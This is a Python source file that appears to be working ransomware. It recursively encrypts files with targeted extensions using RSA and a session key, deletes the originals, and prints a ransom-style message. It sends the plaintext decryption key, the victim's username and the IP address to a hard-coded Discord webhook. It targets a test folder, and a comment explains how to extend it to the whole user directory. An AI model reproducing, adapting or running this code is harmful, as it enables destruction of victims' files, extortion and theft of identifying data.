from pathlib import Path
import logging
import concurrent.futures
import string
import os
import random
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from discord_webhook import DiscordWebhook
import socket
import win32api
import sys

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from utils import *
import pickle
import gc
from utils import (
    fileExtensions,
    server_public_key,
    encrypted_client_private_key_path,
    client_public_key_path,
    ransomware_path,
    maxWorker,
)


def generateEncryptThreads(fileExtensions, password, removeFiles, path):
    fileExtensionFormatted = getTargetFiles(fileExtensions)
    filePaths = []
    for fileExtension in fileExtensionFormatted:
        filePaths = filePaths + list(Path(path).rglob(fileExtension))

    with concurrent.futures.ThreadPoolExecutor(max_workers=maxWorker) as executor:
        for filePath in filePaths:
            global encryptCount
            encryptCount = len(filePaths)
            executor.submit(encryptFile, *(filePath, password))
    if removeFiles:
        for filePath in filePaths:
            filePath.unlink()


def menu():
    if os.path.exists(ransomware_path):
        pass
    else:
        os.mkdir(ransomware_path)
    bit_len = 2048
    key = RSA.generate(bit_len)
    private_key_PEM = key.exportKey()
    public_key_PEM = key.publickey().exportKey()

    Client_private_key = private_key_PEM
    Client_public_key = public_key_PEM
    encrypted_client_private_key = encrypt_keyfile(
        Client_private_key, server_public_key
    )

    with open(encrypted_client_private_key_path, "wb") as output:
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)

    with open(client_public_key_path, "wb") as f:
        f.write(Client_public_key)

    private_key_PEM = None
    Client_private_key = None
    rsa_object = None
    del private_key_PEM
    del rsa_object
    del Client_private_key
    gc.collect()

    removeFiles = True

    #   userpath = os.path.expanduser('~')

    paths = ["C:\\Users\\noahs\\Desktop\\Repos\\LBOZO\\tests"]

    #   only append this path if you want to encrypt all files in your user directory(desktop, documents, downloads, etc.)
    #   paths.append(userpath)

    format = "%(asctime)s: %(message)s"
    logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    for x in range(0, 16):
        session_key = "".join(random.SystemRandom().choice(chars) for _ in range(x))
    session_key = session_key.encode()
    recipient_key = RSA.import_key(open(client_public_key_path).read())
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)
    with open(ransomware_path + "\\session_key.txt", "wb") as f:
        f.write(enc_session_key)

    hostname = socket.gethostname()
    for x in paths:
        path = x
        startTime = time.time()
        session_key = session_key.decode()
        generateEncryptThreads(fileExtensions, session_key, removeFiles, path)
        endTime = time.time()
        webhook = DiscordWebhook(
            url="https://discord.com/api/webhooks/993006430649057381/3vHNIXKrQIg0F1tGVF0R60yRr8YvfJRgVUoFDClPnNDb-EsrdYKTYbpJXV9O14LDgRE5",
            content=f"Decryption Key Generated\n`{session_key}`\nThis key belongs to:\n`{os.getlogin()}, {socket.gethostbyname(hostname)}`\nThis key is valid for `{encryptCount}` files\nTime to encypt: `{int(endTime - startTime)} seconds`",
        )
        webhook.execute()
        session_key = None
        del session_key
        gc.collect()
    print(f"Oh no! Your files have been encrypted!")


menu()
# open decryptor
sys.exit()
